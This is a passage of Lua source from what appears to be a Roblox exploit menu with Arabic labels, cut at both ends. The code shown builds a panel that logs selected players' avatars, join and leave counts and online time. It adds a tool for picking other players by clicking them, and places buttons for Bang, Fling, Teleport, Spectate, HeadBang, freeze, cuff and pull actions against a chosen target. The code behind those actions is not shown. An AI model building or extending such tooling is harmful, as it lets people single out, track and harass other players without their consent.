        local names = {"TlFilter", "TlClear", "TlScroll", "TlFooter", "TlSuggestions"}
        if _t18TargetLogMinimized then
            for _, nm in ipairs(names) do
                local el = TargetLogPanel:FindFirstChild(nm, true)
                if el then el.Visible = false end
            end
        end
        local tween = TweenService:Create(TargetLogPanel, TweenInfo.new(0.26, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
            Size = UDim2.new(0, TargetLogPanel.Size.X.Offset, 0, targetH),
        })
        if not _t18TargetLogMinimized then
            tween.Completed:Connect(function()
                if token ~= _t18TargetLogMinToken or _t18TargetLogMinimized then return end
                for _, nm in ipairs(names) do
                    local el = TargetLogPanel:FindFirstChild(nm, true)
                    if el then
                        el.Visible = (nm ~= "TlSuggestions")
                    end
                end
                local scroll = TargetLogPanel:FindFirstChild("TlScroll", true)
                if scroll then scroll.Visible = true end
            end)
        end
        tween:Play()
    end

    function _t18SetTargetLogVisible(show)
        if not TargetLogPanel then return end
        _t18TargetLogOpen = show
        _t18TargetLogSlideToken = (_t18TargetLogSlideToken or 0) + 1
        local token = _t18TargetLogSlideToken
        local homeX = TargetLogPanel:GetAttribute("HomeX") or TargetLogPanel.Position.X.Offset
        local homeY = TargetLogPanel:GetAttribute("HomeY") or TargetLogPanel.Position.Y.Offset
        if show then
            pcall(function() _refreshTargetLog() end)
            local sug = TargetLogPanel:FindFirstChild("TlSuggestions", true)
            if sug then sug.Visible = false end
            local scroll = TargetLogPanel:FindFirstChild("TlScroll", true)
            if scroll and not _t18TargetLogMinimized then scroll.Visible = true end
            TargetLogPanel.Position = UDim2.new(0, homeX + 16, 0, homeY)
            TargetLogPanel.Visible = true
            local tween = TweenService:Create(TargetLogPanel, TweenInfo.new(0.22, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                Position = UDim2.new(0, homeX, 0, homeY),
            })
            tween:Play()
        else
            local tween = TweenService:Create(TargetLogPanel, TweenInfo.new(0.16, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
                Position = UDim2.new(0, homeX + 16, 0, homeY),
            })
            tween.Completed:Connect(function()
                if token ~= _t18TargetLogSlideToken then return end
                TargetLogPanel.Visible = false
                TargetLogPanel.Position = UDim2.new(0, homeX, 0, homeY)
            end)
            tween:Play()
        end
    end

    do
        local header = TargetLogPanel:FindFirstChild("TlHeader")
        if header then
            local dragging = false
            local dragStart = nil
            local dragPos = nil

            local function clampDrag(input)
                local delta = input.Position - dragStart
                local cam = workspace.CurrentCamera
                local vp = (cam and cam.ViewportSize) or Vector2.new(1280, 720)
                if vp.X <= 0 or vp.Y <= 0 then vp = Vector2.new(1280, 720) end
                local pw = TargetLogPanel.AbsoluteSize.X
                local ph = TargetLogPanel.AbsoluteSize.Y
                if pw <= 0 then pw = TargetLogPanel.Size.X.Offset end
                if ph <= 0 then ph = TargetLogPanel:GetAttribute("ExpandedHeight") or 450 end
                local nx = math.clamp(dragPos.X.Offset + delta.X, 0, math.max(0, vp.X - pw))
                local ny = math.clamp(dragPos.Y.Offset + delta.Y, 0, math.max(0, vp.Y - ph))
                TargetLogPanel.Position = UDim2.new(0, nx, 0, ny)
                TargetLogPanel:SetAttribute("HomeX", nx)
                TargetLogPanel:SetAttribute("HomeY", ny)
            end

            header.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1
                    or input.UserInputType == Enum.UserInputType.Touch then
                    dragging = true
                    dragStart = input.Position
                    dragPos = TargetLogPanel.Position
                    input.Changed:Connect(function()
                        if input.UserInputState == Enum.UserInputState.End then
                            dragging = false
                        end
                    end)
                end
            end)

            UserInputService.InputChanged:Connect(function(input)
                if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
                    or input.UserInputType == Enum.UserInputType.Touch) then
                    clampDrag(input)
                end
            end)
        end
    end

    _t18UpdateLogStats()
end

local _tlFilter = Instance.new("TextBox")
_tlFilter.Name = "TlFilter"
_tlFilter.Size = UDim2.new(1, -20, 0, 34)
_tlFilter.Position = UDim2.new(0, 10, 0, 58)
_tlFilter.BackgroundColor3 = Theme.Input
_tlFilter.BackgroundTransparency = 0.0
_tlFilter.PlaceholderText = "اكتب اسم اللاعب لتسجيله في العداد..."
_tlFilter.Text = ""
_tlFilter.TextColor3 = Theme.Text
_tlFilter.PlaceholderColor3 = Color3.fromRGB(205, 205, 205)
_tlFilter.Font = Enum.Font.GothamMedium
_tlFilter.TextSize = 13
_tlFilter.TextXAlignment = Enum.TextXAlignment.Right
_tlFilter.ClearTextOnFocus = false
_tlFilter.ZIndex = 41
_tlFilter.Parent = TargetLogPanel
makeCorner(_tlFilter, 10)
UiFx.makeGradient(_tlFilter, {
    ColorSequenceKeypoint.new(0, Color3.fromRGB(48, 48, 48)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 20)),
}, 90)
do
    local filterStroke = makeStroke(_tlFilter, Color3.fromRGB(145, 145, 145), 1, 0.05)
    local filterPad = Instance.new("UIPadding")
    filterPad.PaddingRight = UDim.new(0, 12)
    filterPad.PaddingLeft = UDim.new(0, 12)
    filterPad.Parent = _tlFilter

    _tlFilter.Focused:Connect(function()
        filterStroke.Color = Color3.fromRGB(235, 235, 235)
        filterStroke.Transparency = 0.0
    end)
    _tlFilter.FocusLost:Connect(function()
        filterStroke.Color = Color3.fromRGB(145, 145, 145)
        filterStroke.Transparency = 0.05
    end)
end

local _tlClear = Instance.new("TextButton")
_tlClear.Name = "TlClear"
_tlClear.Size = UDim2.new(1, -20, 0, 30)
_tlClear.Position = UDim2.new(0, 10, 0, 98)
_tlClear.BackgroundColor3 = Theme.ButtonDefaultAlt
_tlClear.BackgroundTransparency = 0.0
_tlClear.Text = "مسح السجل"
_tlClear.TextColor3 = Color3.fromRGB(255, 255, 255)
_tlClear.Font = Enum.Font.GothamBold
_tlClear.TextSize = 13
_tlClear.AutoButtonColor = false
_tlClear.ZIndex = 41
_tlClear.Parent = TargetLogPanel
makeCorner(_tlClear, 9)
UiFx.makeGradient(_tlClear, {
    ColorSequenceKeypoint.new(0, Color3.fromRGB(48, 48, 48)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 20)),
}, 90)
do
    local clearStroke = makeStroke(_tlClear, Color3.fromRGB(150, 150, 150), 1, 0.06)
    local clearPad = Instance.new("UIPadding")
    clearPad.PaddingRight = UDim.new(0, 30)
    clearPad.Parent = _tlClear

    local clearIcon = Instance.new("TextLabel")
    clearIcon.Name = "TlClearIcon"
    clearIcon.Size = UDim2.new(0, 20, 1, 0)
    clearIcon.Position = UDim2.new(1, -30, 0, 0)
    clearIcon.BackgroundTransparency = 1
    clearIcon.Text = "×"
    clearIcon.TextColor3 = Color3.fromRGB(245, 245, 245)
    clearIcon.Font = Enum.Font.GothamBlack
    clearIcon.TextSize = 17
    clearIcon.ZIndex = 43
    clearIcon.Parent = _tlClear

    _tlClear.MouseEnter:Connect(function()
        TweenService:Create(_tlClear, TweenInfo.new(0.12), {BackgroundTransparency = 0.0}):Play()
        clearStroke.Transparency = 0.0
    end)
    _tlClear.MouseLeave:Connect(function()
        TweenService:Create(_tlClear, TweenInfo.new(0.18), {BackgroundTransparency = 0.0}):Play()
        clearStroke.Transparency = 0.06
    end)
end

local _tlScroll = Instance.new("ScrollingFrame")
_tlScroll.Name = "TlScroll"
_tlScroll.Size = UDim2.new(1, -20, 1, -186)
_tlScroll.Position = UDim2.new(0, 10, 0, 134)
_tlScroll.BackgroundTransparency = 1
_tlScroll.BorderSizePixel = 0
_tlScroll.ScrollBarThickness = 3
_tlScroll.ScrollBarImageColor3 = Theme.Border
_tlScroll.ScrollBarImageTransparency = 0.25
_tlScroll.CanvasSize = UDim2.new(0,0,0,0)
_tlScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
_tlScroll.ScrollingDirection = Enum.ScrollingDirection.Y
_tlScroll.ZIndex = 41
_tlScroll.Parent = TargetLogPanel
do
    local layout = Instance.new("UIListLayout")
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Padding = UDim.new(0, 6)
    layout.Parent = _tlScroll
    local pad = Instance.new("UIPadding")
    pad.PaddingBottom = UDim.new(0, 8)
    pad.PaddingTop = UDim.new(0, 2)
    pad.PaddingLeft = UDim.new(0, 1)
    pad.PaddingRight = UDim.new(0, 1)
    pad.Parent = _tlScroll
end

_refreshTargetLog = function()
    _T18TimerRefs = {}
    for _, ch in ipairs(_tlScroll:GetChildren()) do
        if ch:IsA("GuiObject") then ch:Destroy() end
    end
    local flt = _tlFilter.Text:lower():gsub("^@",""):gsub("%s+","")
    local rows = {}
    for nm, ent in pairs(_T18TargetLog) do
        local dn = (ent.displayName or nm):lower()
        if flt == "" or nm:lower():find(flt,1,true) or dn:find(flt,1,true) then
            table.insert(rows, {name=nm, ent=ent})
        end
    end
    table.sort(rows, function(a,b) return a.ent.startTime > b.ent.startTime end)
    if #rows == 0 then
        local empty = Instance.new("Frame")
        empty.Name = "TlEmpty"
        empty.Size = UDim2.new(1, 0, 0, 170)
        empty.BackgroundTransparency = 1
        empty.ZIndex = 42
        empty.Parent = _tlScroll

        local badge = Instance.new("Frame")
        badge.Size = UDim2.new(0, 56, 0, 56)
        badge.Position = UDim2.new(0.5, -28, 0, 18)
        badge.BackgroundColor3 = Theme.PanelSoft
        badge.BackgroundTransparency = 0.06
        badge.BorderSizePixel = 0
        badge.ZIndex = 43
        badge.Parent = empty
        makeCorner(badge, 18)
        makeStroke(badge, Theme.Border, 1, 0.2)
        UiFx.makeStarField(badge, 8)

        local icon = Instance.new("TextLabel")
        icon.Size = UDim2.new(1, 0, 1, 0)
        icon.BackgroundTransparency = 1
        icon.Text = "◎"
        icon.TextColor3 = Theme.Accent
        icon.Font = Enum.Font.GothamBold
        icon.TextSize = 24
        icon.ZIndex = 44
        icon.Parent = badge

        local title = Instance.new("TextLabel")
        title.Size = UDim2.new(1, 0, 0, 20)
        title.Position = UDim2.new(0, 0, 0, 86)
        title.BackgroundTransparency = 1
        title.Text = flt ~= "" and "لا توجد نتائج" or "السجل فارغ"
        title.TextColor3 = Theme.Text
        title.Font = Enum.Font.GothamBold
        title.TextSize = 13
        title.TextXAlignment = Enum.TextXAlignment.Center
        title.ZIndex = 43
        title.Parent = empty

        local sub = Instance.new("TextLabel")
        sub.Size = UDim2.new(1, -40, 0, 30)
        sub.Position = UDim2.new(0, 20, 0, 108)
        sub.BackgroundTransparency = 1
        sub.Text = flt ~= "" and "جرّب اسمًا آخر أو امسح البحث" or "حدد لاعباً وسيظهر هنا مع صورته ووقته"
        sub.TextColor3 = Theme.Muted
        sub.Font = Enum.Font.Gotham
        sub.TextSize = 10
        sub.TextWrapped = true
        sub.TextXAlignment = Enum.TextXAlignment.Center
        sub.ZIndex = 43
        sub.Parent = empty

        if _t18UpdateLogStats then _t18UpdateLogStats() end
        return
    end
    for i, rd in ipairs(rows) do
        local ent = rd.ent
        local isOnline = ent.online
        local leaveCount = ent.leaveCount or 0
        local hasLeft = leaveCount > 0
        local statusColor = isOnline and Color3.fromRGB(235, 235, 235) or Color3.fromRGB(145, 145, 145)
        local rowBg = isOnline and Color3.fromRGB(30, 30, 30) or (hasLeft and Color3.fromRGB(20, 20, 20) or Color3.fromRGB(14, 14, 14))
        local rowStrokeColor = isOnline and Color3.fromRGB(105, 105, 105) or (hasLeft and Color3.fromRGB(65, 65, 65) or Theme.Border)
        local hoverBg = isOnline and Color3.fromRGB(42, 42, 42) or (hasLeft and Color3.fromRGB(30, 30, 30) or Color3.fromRGB(24, 24, 24))

        local row = Instance.new("TextButton")
        row.Name = "TlRow_" .. rd.name
        row.Size = UDim2.new(1, 0, 0, 58)
        row.BackgroundColor3 = rowBg
        row.BackgroundTransparency = 0.06
        row.BorderSizePixel = 0
        row.AutoButtonColor = false
        row.Text = ""
        row.LayoutOrder = i
        row.ZIndex = 42
        row.ClipsDescendants = true
        row.Parent = _tlScroll
        makeCorner(row, 9)
        local rowStroke = makeStroke(row, rowStrokeColor, 1, 0.32)

        _T18TimerRefs[rd.name] = _T18TimerRefs[rd.name] or {}
        local refs = _T18TimerRefs[rd.name]
        refs.row = row
        refs.stroke = rowStroke
        refs.rowBg = rowBg
        refs.hoverBg = hoverBg

        local accent = Instance.new("Frame")
        accent.Size = UDim2.new(0, 3, 0, 36)
        accent.Position = UDim2.new(1, -3, 0, 11)
        accent.BackgroundColor3 = statusColor
        accent.BackgroundTransparency = 0.12
        accent.BorderSizePixel = 0
        accent.ZIndex = 43
        accent.Parent = row
        makeCorner(accent, 2)
        refs.accent = accent

        local ring = Instance.new("Frame")
        ring.Size = UDim2.new(0, 40, 0, 40)
        ring.Position = UDim2.new(1, -50, 0, 9)
        ring.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        ring.BorderSizePixel = 0
        ring.ZIndex = 44
        ring.Parent = row
        makeCorner(ring, 99)
        UiFx.makeGradient(ring, {
            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(105, 105, 105)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)),
        }, 0)

        local avatar = Instance.new("ImageLabel")
        avatar.AnchorPoint = Vector2.new(0.5, 0.5)
        avatar.Size = UDim2.new(1, -4, 1, -4)
        avatar.Position = UDim2.new(0.5, 0, 0.5, 0)
        avatar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        avatar.BorderSizePixel = 0
        avatar.ScaleType = Enum.ScaleType.Crop
        avatar.ZIndex = 45
        avatar.Parent = ring
        makeCorner(avatar, 99)

        local fallback = Instance.new("TextLabel")
        fallback.Size = UDim2.new(1, 0, 1, 0)
        fallback.BackgroundTransparency = 1
        fallback.Text = string.upper(rd.name:match("%a") or "?")
        fallback.TextColor3 = Theme.Text
        fallback.Font = Enum.Font.GothamBlack
        fallback.TextSize = 15
        fallback.ZIndex = 46
        fallback.Parent = avatar

        local uid = ent.userId
        if not uid then
            local onlinePlayer = Players:FindFirstChild(rd.name)
            if onlinePlayer then uid = onlinePlayer.UserId end
        end
        if uid then
            avatar.Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(uid) .. "&w=150&h=150"
            fallback.Visible = false
        end
        refs.avatar = avatar
        refs.fallback = fallback

        local dot = Instance.new("Frame")
        dot.Size = UDim2.new(0, 11, 0, 11)
        dot.Position = UDim2.new(0, 1, 1, -12)
        dot.BackgroundColor3 = statusColor
        dot.BorderSizePixel = 0
        dot.ZIndex = 46
        dot.Parent = ring
        makeCorner(dot, 99)
        makeStroke(dot, Color3.fromRGB(5, 6, 9), 2, 0)
        refs.dot = dot

        if (ent.count or 1) > 1 then
            local seen = Instance.new("TextLabel")
            seen.Size = UDim2.new(0, 22, 0, 13)
            seen.Position = UDim2.new(0, -6, 0, -5)
            seen.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
            seen.BackgroundTransparency = 0.04
            seen.Text = "×" .. tostring(ent.count)
            seen.TextColor3 = Color3.fromRGB(235, 235, 235)
            seen.Font = Enum.Font.GothamBold
            seen.TextSize = 8
            seen.ZIndex = 47
            seen.Parent = ring
            makeCorner(seen, 6)
            makeStroke(seen, Theme.Border, 1, 0.35)
        end

        local nameLbl = Instance.new("TextLabel")
        nameLbl.Size = UDim2.new(1, -134, 0, 18)
        nameLbl.Position = UDim2.new(0, 76, 0, 6)
        nameLbl.BackgroundTransparency = 1
        nameLbl.Text = ent.displayName or rd.name
        nameLbl.TextColor3 = Theme.Text
        nameLbl.TextXAlignment = Enum.TextXAlignment.Right
        nameLbl.Font = Enum.Font.GothamBold
        nameLbl.TextSize = 13
        nameLbl.TextTruncate = Enum.TextTruncate.AtEnd
        nameLbl.ZIndex = 43
        nameLbl.Parent = row
        refs.nameLabel = nameLbl

        local userLbl = Instance.new("TextLabel")
        userLbl.Size = UDim2.new(1, -134, 0, 12)
        userLbl.Position = UDim2.new(0, 76, 0, 23)
        userLbl.BackgroundTransparency = 1
        userLbl.Text = rd.name
        userLbl.TextColor3 = Theme.Muted
        userLbl.TextXAlignment = Enum.TextXAlignment.Right
        userLbl.Font = Enum.Font.Gotham
        userLbl.TextSize = 9
        userLbl.TextTruncate = Enum.TextTruncate.AtEnd
        userLbl.ZIndex = 43
        userLbl.Parent = row
        refs.userLabel = userLbl

        local countLbl = Instance.new("TextLabel")
        countLbl.Size = UDim2.new(1, -134, 0, 12)
        countLbl.Position = UDim2.new(0, 76, 0, 37)
        countLbl.BackgroundTransparency = 1
        countLbl.Text = "دخول " .. tostring(ent.joinCount or 0) .. "  •  خروج " .. tostring(leaveCount)
        countLbl.TextColor3 = hasLeft and Color3.fromRGB(200, 200, 200) or Color3.fromRGB(235, 235, 235)
        countLbl.TextXAlignment = Enum.TextXAlignment.Right
        countLbl.Font = Enum.Font.Gotham
        countLbl.TextSize = 9
        countLbl.TextTruncate = Enum.TextTruncate.AtEnd
        countLbl.ZIndex = 43
        countLbl.Parent = row
        refs.countLabel = countLbl

        local timerChip = Instance.new("Frame")
        timerChip.Size = UDim2.new(0, 64, 0, 19)
        timerChip.Position = UDim2.new(0, 8, 0, 9)
        timerChip.BackgroundColor3 = Theme.Input
        timerChip.BackgroundTransparency = 0.12
        timerChip.BorderSizePixel = 0
        timerChip.ZIndex = 43
        timerChip.Parent = row
        makeCorner(timerChip, 6)
        makeStroke(timerChip, Theme.Border, 1, 0.35)

        local timerLbl = Instance.new("TextLabel")
        timerLbl.Size = UDim2.new(1, 0, 1, 0)
        timerLbl.BackgroundTransparency = 1
        timerLbl.Text = "منذ " .. _t18FmtTimer(_t18OnlineTime(ent))
        timerLbl.TextColor3 = Theme.Text
        timerLbl.Font = Enum.Font.Code
        timerLbl.TextSize = 9
        timerLbl.TextXAlignment = Enum.TextXAlignment.Center
        timerLbl.ZIndex = 44
        timerLbl.Parent = timerChip
        refs.timer = timerLbl

        local statusLbl = Instance.new("TextLabel")
        statusLbl.Size = UDim2.new(0, 60, 0, 14)
        statusLbl.Position = UDim2.new(0, 8, 0, 31)
        statusLbl.BackgroundTransparency = 1
        statusLbl.Text = isOnline and "● متصل" or "● خارج"
        statusLbl.TextColor3 = statusColor
        statusLbl.TextXAlignment = Enum.TextXAlignment.Left
        statusLbl.Font = Enum.Font.GothamBold
        statusLbl.TextSize = 9
        statusLbl.ZIndex = 43
        statusLbl.Parent = row
        refs.status = statusLbl

        local hoverTween
        row.MouseEnter:Connect(function()
            if hoverTween then hoverTween:Cancel() end
            hoverTween = TweenService:Create(row, TweenInfo.new(0.12, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                BackgroundColor3 = refs.hoverBg or hoverBg,
            })
            hoverTween:Play()
            rowStroke.Transparency = 0.12
        end)
        row.MouseLeave:Connect(function()
            if hoverTween then hoverTween:Cancel() end
            hoverTween = TweenService:Create(row, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                BackgroundColor3 = refs.rowBg or rowBg,
            })
            hoverTween:Play()
            rowStroke.Transparency = 0.32
        end)

        local trackedName = rd.name
        row.MouseButton1Click:Connect(function()
            _t18LogTarget(trackedName)
            _t18SetTargetLogVisible(false)
        end)
    end
    if _t18UpdateLogStats then _t18UpdateLogStats() end
end

RunService.Heartbeat:Connect(function()
    if not TargetLogPanel.Visible or _t18TargetLogMinimized then return end
    for nm, ent in pairs(_T18TargetLog) do
        local refs = _T18TimerRefs[nm]
        if refs and refs.timer then
            refs.timer.Text = "منذ " .. _t18FmtTimer(_t18OnlineTime(ent))
        end
    end
end)

_tlSuggestions = Instance.new("Frame")
_tlSuggestions.Name = "TlSuggestions"
_tlSuggestions.Size = UDim2.new(1, -20, 0, 0)
_tlSuggestions.Position = UDim2.new(0, 10, 0, 98)
_tlSuggestions.BackgroundColor3 = Theme.Card
_tlSuggestions.BackgroundTransparency = 0.02
_tlSuggestions.BorderSizePixel = 0
_tlSuggestions.Visible = false
_tlSuggestions.ZIndex = 60
_tlSuggestions.ClipsDescendants = true
_tlSuggestions.Parent = TargetLogPanel
makeCorner(_tlSuggestions, 9)
makeStroke(_tlSuggestions, Theme.Border, 1, 0.18)
UiFx.makeGradient(_tlSuggestions, {
    ColorSequenceKeypoint.new(0, Color3.fromRGB(22, 22, 22)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 6, 6)),
}, 90)
UiFx.makeStarField(_tlSuggestions, 10)
do
    local layout = Instance.new("UIListLayout")
    layout.Padding = UDim.new(0, 1)
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Parent = _tlSuggestions
    local pad = Instance.new("UIPadding")
    pad.PaddingLeft = UDim.new(0, 6)
    pad.PaddingRight = UDim.new(0, 6)
    pad.PaddingTop = UDim.new(0, 3)
    pad.PaddingBottom = UDim.new(0, 3)
    pad.Parent = _tlSuggestions
end

do
    local _lastAutoTargetName = ""

    local function hideTargetSuggestions()
        _tlSuggestions.Visible = false
        _tlScroll.Visible = true
        for _, child in ipairs(_tlSuggestions:GetChildren()) do
            if child:IsA("TextButton") then child:Destroy() end
        end
    end

    local function selectTargetSuggestion(name)
        _lastAutoTargetName = name

        _t18LogTarget(name)

        _tlFilter.Text = ""

        pcall(function() _refreshTargetLog() end)
        hideTargetSuggestions()
    end

    local function showTargetSuggestions(matches)
        _tlScroll.Visible = false
        for _, child in ipairs(_tlSuggestions:GetChildren()) do
            if child:IsA("TextButton") then child:Destroy() end
        end

        local shown = math.min(#matches, 6)
        _tlSuggestions.Size = UDim2.new(1, -20, 0, shown * 30 + 6)

        for i = 1, shown do
            local player = matches[i]
            local suggestion = Instance.new("TextButton")
            suggestion.Size = UDim2.new(1, 0, 0, 26)
            suggestion.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            suggestion.BackgroundTransparency = 1
            suggestion.BorderSizePixel = 0
            suggestion.AutoButtonColor = false
            suggestion.Text = player.Name
            suggestion.TextColor3 = Theme.Text
            suggestion.TextXAlignment = Enum.TextXAlignment.Right
            suggestion.Font = Enum.Font.GothamMedium
            suggestion.TextSize = 11
            suggestion.TextTruncate = Enum.TextTruncate.AtEnd
            suggestion.LayoutOrder = i
            suggestion.ZIndex = 61
            suggestion.Parent = _tlSuggestions
            makeCorner(suggestion, 6)

            local suggestionPad = Instance.new("UIPadding")
            suggestionPad.PaddingRight = UDim.new(0, 30)
            suggestionPad.PaddingLeft = UDim.new(0, 8)
            suggestionPad.Parent = suggestion

            local sugAvatar = Instance.new("ImageLabel")
            sugAvatar.Size = UDim2.new(0, 18, 0, 18)
            sugAvatar.Position = UDim2.new(1, -24, 0.5, -9)
            sugAvatar.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
            sugAvatar.BorderSizePixel = 0
            sugAvatar.Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(player.UserId) .. "&w=48&h=48"
            sugAvatar.ZIndex = 62
            sugAvatar.Parent = suggestion
            makeCorner(sugAvatar, 99)
            makeStroke(sugAvatar, Theme.Border, 1, 0.2)

            suggestion.MouseEnter:Connect(function()
                suggestion.BackgroundTransparency = 0.9
                suggestion.TextColor3 = Theme.Accent
            end)
            suggestion.MouseLeave:Connect(function()
                suggestion.BackgroundTransparency = 1
                suggestion.TextColor3 = Theme.Text
            end)

            local selectedName = player.Name
            suggestion.MouseButton1Click:Connect(function()
                selectTargetSuggestion(selectedName)
            end)
        end

        _tlSuggestions.Visible = shown > 0
    end

    _tlFilter.FocusLost:Connect(function(enterPressed)
        if not enterPressed then return end
        local typedName = (_tlFilter.Text or ""):gsub("^@", ""):gsub("%s+", "")
        if #typedName < 2 then return end

        local matched = nil
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Name:lower() == typedName:lower() then
                matched = player break
            end
        end
        if not matched then
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= LocalPlayer and player.Name:lower():find(typedName:lower(), 1, true) then
                    matched = player break
                end
            end
        end
        if not matched then return end

        _t18LogTarget(matched.Name)
        _tlFilter.Text = ""
        _lastAutoTargetName = ""
        hideTargetSuggestions()
        pcall(function() _refreshTargetLog() end)
    end)

    _tlFilter:GetPropertyChangedSignal("Text"):Connect(function()
        local typedName = (_tlFilter.Text or ""):gsub("^@", ""):gsub("%s+", "")
        local query = typedName:lower()
        if #query < 2 then
            _lastAutoTargetName = ""
            hideTargetSuggestions()
            return
        end

        local matches = {}
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Name:lower():find(query, 1, true) then
                table.insert(matches, player)
            end
        end
        table.sort(matches, function(a, b) return a.Name:lower() < b.Name:lower() end)

        if #matches >= 1 then
            _lastAutoTargetName = ""
            showTargetSuggestions(matches)
        else
            _lastAutoTargetName = ""
            hideTargetSuggestions()
        end
    end)
end

_tlClear.MouseButton1Click:Connect(function()
    _T18TargetLog = {}
    _T18TimerRefs = {}
    _refreshTargetLog()
    if _t18UpdateLogStats then _t18UpdateLogStats() end
end)
ListBtn.MouseButton1Click:Connect(function()
    if _t18TargetLogOpen then
        _t18SetTargetLogVisible(false)
    else
        _t18SetTargetLogVisible(true)
    end
end)

local pickerActive = false
local pickerTool = nil
local pickerMouse = nil
local pickerConns = {activated=nil, unequipped=nil}

local function destroyPickerTool()
    for _, c in pairs(pickerConns) do if c then pcall(function() c:Disconnect() end) end end
    pickerConns = {activated=nil, unequipped=nil}
    if pickerTool then
        pcall(function() pickerTool:Destroy() end)
        pickerTool = nil
    end
    pickerMouse = nil
    pickerActive = false
    PickerBtn.BackgroundColor3 = Theme.ButtonBlue
    PickerBtn.Text = ""
    local _pi2 = PickerBtn:FindFirstChild("PickerIcon") if _pi2 then _pi2.Visible = true end
end

LocalPlayer.CharacterRemoving:Connect(function()
    destroyPickerTool()
end)

PickerBtn.MouseButton1Click:Connect(function()
    if pickerActive then
        destroyPickerTool()
        return
    end

    local char = LocalPlayer.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end

    local tool = Instance.new("Tool")
    tool.Name = "T18PickerTool"
    tool.RequiresHandle = false
    tool.CanBeDropped = false
    tool.TextureId = "rbxassetid://91902279498907"
    tool.ManualActivationOnly = false
    tool.ToolTip = ""

    tool.Equipped:Connect(function(mouse)
        pickerMouse = mouse
        mouse.Icon = "rbxasset://SystemCursors/PointingHand"
    end)

    pickerConns.activated = tool.Activated:Connect(function()
        if not pickerMouse then return end
        local target = pickerMouse.Target
        if not target then return end
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer
                and player.Character
                and target:IsDescendantOf(player.Character) then
                Input.Text = player.Name
                _t18LogTarget(player.Name)
                if _t18TargetLogOpen then
                    pcall(function() _refreshTargetLog() end)
                end
                break
            end
        end
    end)

    pickerActive = true
    PickerBtn.BackgroundColor3 = Theme.Active
    PickerBtn.Text = "X"
    local _pi = PickerBtn:FindFirstChild("PickerIcon") if _pi then _pi.Visible = false end
    pickerTool = tool
    tool.Parent = LocalPlayer.Backpack
    pcall(function() hum:EquipTool(tool) end)
end)

BangBtn.Parent = TargetPage
BangBtn.Size = UDim2.new(0.5, -14, 0, 38)
BangBtn.Position = UDim2.new(0, 10, 0, 216)

ResetBtn.Parent = TargetPage
ResetBtn.Size = UDim2.new(0.5, -14, 0, 38)
ResetBtn.Position = UDim2.new(0.5, 4, 0, 304)

FlingBtn.Parent = MudadatPage
FlingBtn.Size = UDim2.new(0.5, -14, 0, 34)
FlingBtn.Position = UDim2.new(0, 10, 0, 134)

TargetFlingBtn.Parent = TargetPage
TargetFlingBtn.Size = UDim2.new(0.5, -14, 0, 38)
TargetFlingBtn.Position = UDim2.new(0.5, 4, 0, 260)

TeleportBtn.Parent = TargetPage
TeleportBtn.Size = UDim2.new(0.5, -14, 0, 38)
TeleportBtn.Position = UDim2.new(0, 10, 0, 304)

SpectateBtn.Parent = TargetPage
SpectateBtn.Size = UDim2.new(0.5, -14, 0, 38)
SpectateBtn.Position = UDim2.new(0.5, 4, 0, 216)

HeadBangBtn.Parent = TargetPage
HeadBangBtn.Size = UDim2.new(0.5, -14, 0, 38)
HeadBangBtn.Position = UDim2.new(0, 10, 0, 260)

HangAutoBtn.Parent = KlabshatPage
HangAutoBtn.Size = UDim2.new(0.5, -14, 0, 38)
HangAutoBtn.Position = UDim2.new(0.5, 4, 0, 84)

do
    local shaliLabel = Instance.new("TextLabel")
    shaliLabel.Size = UDim2.new(1, -20, 0, 20)
    shaliLabel.Position = UDim2.new(0, 10, 0, 58)
    shaliLabel.BackgroundTransparency = 1
    shaliLabel.Text = "اوامر شاليه محمد (الاصلي فقط)"
    shaliLabel.TextColor3 = Color3.fromRGB(180, 20, 30)
    shaliLabel.TextXAlignment = Enum.TextXAlignment.Center
    shaliLabel.Font = Enum.Font.GothamBold
    shaliLabel.TextSize = 13
    shaliLabel.Parent = KlabshatPage
end

_Hang.freezeBtn.Parent   = KlabshatPage
_Hang.freezeBtn.Size     = UDim2.new(0.5, -14, 0, 38)
_Hang.freezeBtn.Position = UDim2.new(0,    10,  0, 84)

_Hang.cuffBtn.Parent   = KlabshatPage
_Hang.cuffBtn.Size     = UDim2.new(0.5, -14, 0, 38)
_Hang.cuffBtn.Position = UDim2.new(0,    10, 0, 128)

_Hang.pullBtn.Parent   = KlabshatPage
_Hang.pullBtn.Size     = UDim2.new(0.5, -14, 0, 38)
_Hang.pullBtn.Position = UDim2.new(0.5,   4,  0, 128)

do
do
    local cuffNotice = Instance.new("TextLabel")
    cuffNotice.Name = "KlabshatNotice"
    cuffNotice.Size = UDim2.new(1, -20, 0, 20)
    cuffNotice.Position = UDim2.new(0, 10, 0, 174)
    cuffNotice.BackgroundTransparency = 1
    cuffNotice.Text = T18T("اوامر كلبشه فقط لشاليه عوده")
    cuffNotice.TextColor3 = Color3.fromRGB(220, 35, 45)
